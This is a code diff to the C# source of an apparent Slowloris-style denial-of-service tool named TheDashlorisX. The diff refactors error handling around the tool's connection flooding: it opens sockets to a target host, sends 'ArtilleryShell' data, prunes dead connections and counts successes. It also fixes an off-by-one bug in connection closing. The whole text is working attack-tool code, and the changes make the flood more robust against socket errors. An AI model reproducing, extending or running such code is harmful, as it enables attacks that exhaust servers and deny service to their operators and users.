@@ -146,33 +146,25 @@ namespace TheDashlorisX
 	{
 	    try
 	    {
-		if (SprucyLog.RequiresInit)
+		void Invoker()
 		{
-		    void Invoker()
+		    if (SprucyLog.RequiresInit)
 		    {
-			try
-			{
-			    SprucyLog.InitializePage(DashWindow, Capsule);
+			SprucyLog.InitializePage(DashWindow, Capsule);
+		    }
 
-			    foreach (Control Control in Capsule.Controls)
-			    {
-				if (Control.Visible)
-				{
-				    Control.Hide();
-				}
-			    }
-			}
-
-			catch (Exception E)
+		    foreach (Control Control in Capsule.Controls)
+		    {
+			if (Control.Visible)
 			{
-			    throw (ErrorHandler.GetException(E));
+			    Control.Hide();
 			}
 		    }
 
-		    Capsule.Invoke(new MethodInvoker(Invoker));
-
 		    SprucyLog.Show();
 		}
+
+		Capsule.Invoke(new MethodInvoker(Invoker));
 
 		SendLog("- Validating configuration ....");
 
@@ -323,9 +315,10 @@ namespace TheDashlorisX
 			    DashShell.Send(Encoding.ASCII.GetBytes(Coal));
 			}
 
-			catch
+			catch (Exception E)
 			{
-			    DashShell.Close();
+			    ErrorHandler.JustDoIt(E);
+			    DashShell.Close(0);
 			}
 		    }
 		}
@@ -414,10 +407,27 @@ namespace TheDashlorisX
 		{
 		    void CleanupConnectable(ref List<Socket> _Connectables, int Id)
 		    {
-			ReportStatics(Logy, false);
+			try
+			{
+			    ReportStatics(Logy, false);
 
-			_Connectables[Id].Close(0);
-			_Connectables.RemoveAt(Id);
+			    try
+			    {
+				_Connectables[Id].Close(0);
+			    }
+
+			    catch
+			    {
+				//whatever;
+			    }
+
+			    _Connectables.RemoveAt(Id);
+			}
+
+			catch (Exception E)
+			{
+			    throw (ErrorHandler.GetException(E));
+			}
 		    }
 
 		    for (int Id = 0; Id < Connectables.Count; Id += 1)
@@ -426,19 +436,27 @@ namespace TheDashlorisX
 			{
 			    byte[] Lead = Encoding.ASCII.GetBytes("Are you alive?");
 
-			    int Response = Connectables[Id].Receive(Lead, Lead.Length,SocketFlags.None);
+			    try
+			    {
+				int Response = Connectables[Id].Receive(Lead, Lead.Length, SocketFlags.None);
 
-			    if (Response < Lead.Length)
+				if (Response < Lead.Length)
+				{
+				    CleanupConnectable(ref Connectables, Id);
+				    continue;
+				}
+			    }
+
+			    catch
 			    {
 				CleanupConnectable(ref Connectables, Id);
 				continue;
 			    }
 			}
 
-			catch
+			catch (Exception E)
 			{
-			    CleanupConnectable(ref Connectables, Id);
-			    continue;
+			    throw (ErrorHandler.GetException(E));
 			}
 		    }
 		}
@@ -509,22 +527,25 @@ namespace TheDashlorisX
 					    break;
 					}
 
-					Socket DashShell = GetSocket(Host, Port);
-
-					var results = DashShell.BeginConnect(Host, Port, null, null);
-					var success = results.AsyncWaitHandle.WaitOne(Timeout);
-
-					if (DashShell.Connected)
+					try
 					{
-					    SendArtilleryShell(DashShell, Tier1, Tier2);
-					    Connections.Add(DashShell);
+					    Socket DashShell = GetSocket(Host, Port);
 
-					    ReportStatics(Logy, true);
+					    var results = DashShell.BeginConnect(Host, Port, null, null);
+					    var success = results.AsyncWaitHandle.WaitOne(Timeout);
+
+					    if (DashShell.Connected)
+					    {
+						SendArtilleryShell(DashShell, Tier1, Tier2);
+						Connections.Add(DashShell);
+
+						ReportStatics(Logy, true);
+					    }
 					}
 
-					else
+					catch
 					{
-					    DashShell.Close();
+					    continue;
 					}
 
 					CurrentRequests += 1;
@@ -543,9 +564,9 @@ namespace TheDashlorisX
 					{
 					    for (int Id = (Connections.Count / 4) * Connection; Id <= (Connections.Count / 4) * Connection; Id += 1)
 					    {
-						if (Connections[Id - 1].Connected)
+						if (Connections[Id].Connected)
 						{
-						    Connections[Id - 1].Close(0);
+						    Connections[Id].Close(0);
 						}
 					    }
 
